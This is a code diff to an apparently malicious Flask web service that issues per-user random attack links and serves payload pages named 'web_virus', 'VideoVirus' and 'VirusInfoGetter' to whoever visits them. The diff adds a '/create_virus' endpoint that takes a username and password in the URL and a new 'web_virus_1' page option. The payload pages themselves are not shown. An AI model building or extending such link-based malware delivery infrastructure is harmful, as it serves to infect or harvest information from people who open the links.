@@ -282,6 +282,33 @@ def create_web_virus(user , pwd):
 
     else:
         return 'your message error' 
+    
+@app.route('/create_virus/<user>/<pwd>/<type>' , methods=['GET'])
+def create_virus(user , pwd , type):
+    # 限制每个IP对制定api的访问.
+    client_ip = request.remote_addr
+    if client_ip in visit_request:
+        visit_request[client_ip] = visit_request[client_ip] + 1
+        if visit_request[client_ip] >= 6:
+            return 'Too many requests'
+    else:
+        visit_request[client_ip] = 1
+
+    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
+    if r.text != 'Passwd Or UserName Error!':
+        n = get_random()
+        
+        u = user_sessen()
+        u.url = n
+        u.attack_type = type
+        u.username = user
+        u.url_clone = attack_url
+
+        url_list[n] = u
+        return n
+
+    else:
+        return 'your message error' 
 
 @app.route('/qr_code' , methods=['POST'])
 def make_qr_code():
@@ -517,6 +544,8 @@ def attack_url(attack_url):
         try:
             if u.attack_type == 'web_virus':
                 r.data = open('modules/web_virus/index.html').read()
+            elif u.attack_type == 'web_virus_1':
+                r.data = open('modules/web_virus/index_1.html').read()
             elif u.attack_type == 'VideoVirus':
                 r.data = open('modules/VideoVirus/index.html').read()
             elif u.attack_type == 'VirusInfoGetter':
